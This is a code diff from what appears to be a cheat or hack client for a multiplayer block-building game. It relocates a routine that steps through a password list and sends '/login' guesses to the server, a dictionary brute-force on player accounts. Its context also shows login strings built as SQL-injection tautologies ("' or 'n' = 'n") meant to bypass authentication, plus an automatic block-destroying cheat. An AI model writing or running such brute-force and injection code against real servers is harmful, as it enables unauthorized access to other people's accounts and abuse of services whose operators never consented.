@@ -18593,6 +18593,12 @@ function rptask3() {
 							Server.getPort();
 							if (Server.getPort() == "0") clientMessage(offtime + " " + text + " " + offtime);
 						}
+						if (newpasshack){
+							numhack3++
+							let passwords = allDePasswords[numhack3];
+							Server.sendChat("./login "+passwords);
+							clientMessage(client + "/login "+passwords);
+						}
 						nx = getPlayerX();
 						ny = getPlayerY();
 						nz = getPlayerZ();
@@ -18665,12 +18671,6 @@ function rptask() {
 							numhack2++
 							Server.sendChat("./login " + numhack2 + "' or '" + numhack2 + "' = '" + numhack2);
 							clientMessage("./login " + numhack2 + "' or '" + numhack2 + "' = '" + numhack2);
-						}
-						if (newpasshack){
-							numhack3++
-							let passwords = allDePasswords[numhack3];
-							Server.sendChat("./login "+passwords);
-							clientMessage(client + "/login "+passwords);
 						}
 						if (autodestroy) {
 							Level.destroyBlock(Player.getPointedBlockX(), Player.getPointedBlockY(), Player.getPointedBlockZ(), vidd);
